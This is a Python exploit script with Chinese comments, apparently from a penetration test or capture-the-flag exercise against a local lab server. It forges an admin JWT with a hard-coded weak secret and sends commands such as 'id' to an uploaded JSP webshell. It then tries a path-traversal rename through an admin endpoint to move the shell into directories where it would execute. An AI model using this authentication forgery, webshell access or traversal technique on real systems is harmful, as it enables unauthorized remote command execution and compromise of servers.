#!/usr/bin/env python3
"""
使用requests直接查看HTML响应
"""

import jwt
import requests

TARGET = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

# 创建 admin token
payload = {"sub": "admin", "role": "admin"}
admin_token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")

headers = {"Cookie": f"token={admin_token}"}

shell_url = f"{TARGET}/uploads/shell.jsp"

# 直接测试 webshell - 获取原始响应
print(f"[*] 测试 {shell_url}?cmd=id\n")
r = requests.get(f"{shell_url}?cmd=id", headers=headers)
print(f"Status: {r.status_code}")
print(f"Content-Type: {r.headers.get('Content-Type')}")
print(f"Content-Length: {len(r.content)}")
print(f"\nRaw Response:")
print("="*80)
print(r.text)
print("="*80)

# 检查是否JSP被解析
if "<%@ page" in r.text:
    print("\n[!] JSP源代码被直接返回，没有被执行")
    print("[*] uploads目录可能不支持JSP执行")
    print("\n[*] 寻找可执行JSP的目录...")
    
    # 尝试将文件移动到可执行的位置
    test_dirs = [
        "/",
        "/admin",
        "/dashboard",
    ]
    
    for dir in test_dirs:
        try:
            # 尝试通过 rename 移动文件
            r = requests.post(
                f"{TARGET}/admin/rename",
                headers=headers,
                json={"path": "shell.jsp", "oldName": "shell.jsp", "newName": f"../{dir.strip('/')}/shell.jsp"},
                timeout=5
            )
            print(f"\n[*] 尝试移动到 {dir}: {r.status_code} - {r.text[:100]}")
        except:
            pass
else:
    print("\n[+] JSP可能被执行了!")
